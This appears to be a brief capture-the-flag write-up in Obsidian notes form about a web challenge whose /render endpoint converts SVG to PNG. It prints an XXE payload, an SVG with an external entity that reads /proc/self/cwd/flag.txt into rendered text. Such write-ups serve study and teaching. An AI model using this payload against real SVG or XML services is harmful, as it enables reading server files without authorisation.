![[Pasted image 20230222093051.png|500]]

```
/
```

![[Pasted image 20230222093257.png|500]]

```
/render
```

![[Pasted image 20230222093428.png|300]]

可以将SVG转成PNG，存在XXE的可能性

```svg
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg [
	<!ENTITY flag SYSTEM "file:///proc/self/cwd/flag.txt">
]>
<svg ...>
	...
	<text ...>&flag;</text>
</svg>
```

![[Pasted image 20230222100657.png|300]]

#Web #svg #XXE